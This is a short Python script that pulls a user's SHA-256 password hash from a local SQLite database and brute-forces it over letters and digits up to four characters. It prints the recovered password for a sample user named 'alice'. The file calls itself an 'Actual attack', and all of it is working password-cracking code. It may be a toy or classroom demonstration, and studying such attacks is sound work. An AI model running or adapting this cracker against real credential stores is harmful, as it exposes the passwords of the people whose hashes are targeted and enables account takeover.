import hashlib
import itertools
import sqlite3
import string

def get_user_hash(username, db_file="users.db"):
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

def brute_force_attack(target_hash, max_length=4): #Actual attack
    chars = string.ascii_letters + string.digits
    
    for length in range(1, max_length + 1):
        for attempt in itertools.product(chars, repeat=length):
            candidate = "".join(attempt)
            if hashlib.sha256(candidate.encode()).hexdigest() == target_hash:
                return candidate
    return None

if __name__ == "__main__":
    target_user = "alice"
    target_hash = get_user_hash(target_user)
    
    if target_hash:
        print(f"[*] Target User: {target_user}")
        print(f"[*] Target Hash: {target_hash}")
        result = brute_force_attack(target_hash, max_length=4)
        if result:
            print(f"[+] Success! Password for '{target_user}' is: {result}")
        else:
            print("[-] Password not found within character length limit.")